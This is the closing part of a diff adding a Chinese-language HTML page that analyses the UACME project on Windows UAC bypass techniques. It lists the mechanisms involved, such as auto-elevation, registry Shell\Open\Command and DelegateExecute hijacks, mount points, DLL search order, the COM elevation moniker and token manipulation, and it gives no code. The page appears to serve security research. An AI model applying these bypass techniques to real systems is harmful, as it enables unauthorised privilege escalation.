+                        <li>AppInfo服务原理</li>
+                        <li>auto-elevation机制</li>
+                        <li>Consent.exe工作流程</li>
+                        <li>可信目录验证</li>
+                    </ul>
+                </div>
+
+                <div class="tech-item">
+                    <div class="tech-title">RPC编程</div>
+                    <ul>
+                        <li>LaunchAdminProcess接口</li>
+                        <li>异步RPC调用</li>
+                        <li>ncalrpc协议</li>
+                        <li>MIDL生成代码</li>
+                    </ul>
+                </div>
+
+                <div class="tech-item">
+                    <div class="tech-title">注册表安全</div>
+                    <ul>
+                        <li>符号链接(REG_LINK)</li>
+                        <li>Shell\Open\Command</li>
+                        <li>DelegateExecute机制</li>
+                        <li>HKCR虚拟化</li>
+                    </ul>
+                </div>
+
+                <div class="tech-item">
+                    <div class="tech-title">文件系统</div>
+                    <ul>
+                        <li>重解析点</li>
+                        <li>挂载点(Mount Point)</li>
+                        <li>路径解析行为</li>
+                        <li>DLL搜索顺序</li>
+                    </ul>
+                </div>
+
+                <div class="tech-item">
+                    <div class="tech-title">COM机制</div>
+                    <ul>
+                        <li>提升Moniker</li>
+                        <li>IFileOperation接口</li>
+                        <li>auto-elevation COM类</li>
+                        <li>CoGetObject调用</li>
+                    </ul>
+                </div>
+
+                <div class="tech-item">
+                    <div class="tech-title">令牌操作</div>
+                    <ul>
+                        <li>UIAccess权限</li>
+                        <li>完整性级别</li>
+                        <li>令牌复制</li>
+                        <li>NtSetInformationToken</li>
+                    </ul>
+                </div>
+            </div>
+        </section>
+
+        <footer>
+            <p>本文档仅供安全研究和学习使用，请勿用于非法用途</p>
+            <p>UACME项目分析 - Windows UAC绕过技术研究</p>
+        </footer>
+    </div>
+</body>
+</html>
